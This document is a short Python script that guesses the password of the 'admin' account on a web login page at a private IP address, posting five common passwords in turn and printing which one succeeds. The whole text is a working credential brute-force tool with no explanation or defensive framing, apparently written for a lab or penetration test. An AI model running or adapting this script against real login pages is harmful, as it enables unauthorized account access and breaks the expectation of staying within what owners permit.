import requests

url = "http://192.168.223.152/login"
username = "admin"
passwords = ["admin", "123456", "password", "letmein", "root"]

for pwd in passwords:
    data = {"username": username, "password": pwd}
    response = requests.post(url, data=data)
    
    if "invalid" not in response.text.lower():
        print(f"[+] Success: {username}:{pwd}")
        break
    else:
        print(f"[-] Failed: {username}:{pwd}")
